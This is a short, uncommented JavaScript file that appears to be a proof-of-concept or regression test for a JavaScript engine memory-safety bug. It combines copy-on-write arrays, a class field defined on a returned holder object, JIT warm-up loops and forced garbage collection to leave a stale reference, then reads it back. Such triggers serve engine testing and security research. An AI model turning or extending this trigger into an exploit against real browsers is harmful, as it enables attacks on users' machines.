function ForceGC() {
    try {
        new ArrayBuffer(2 ** 34);
    } catch(e6) {
    }
}
old_space_array = Array(1, 2);
function CopyElement(a13, a14) {
    a14[0] = a13[0];
}
for (let i17 = 0; i17 < 10000; ++i17) {
    CopyElement(old_space_array, old_space_array);
}
ForceGC();
function MakeCOW() {
    return [0];
}
original_cow_object = MakeCOW();
function MakeCopy() {
    let copy = original_cow_object.concat();
    copy.splice();
    return copy;
}
new_value = 1;
new_value = {};
function ReturnHolder() {
    return define_property_holder;
}
class C43 extends ReturnHolder {
    0 = new_value;
}
for (let i45 = 0; i45 < 10000; ++i45) {
    define_property_holder = MakeCopy();
    new C43();
}
new_value = {};
define_property_holder = MakeCOW();
new C43();
new_space_array = MakeCOW();
new_space_array.splice();
CopyElement(new_space_array, old_space_array);
new_value = "";
define_property_holder = MakeCOW();
new C43();
new_space_array = null;
ForceGC();
console.log(old_space_array[0][0]);
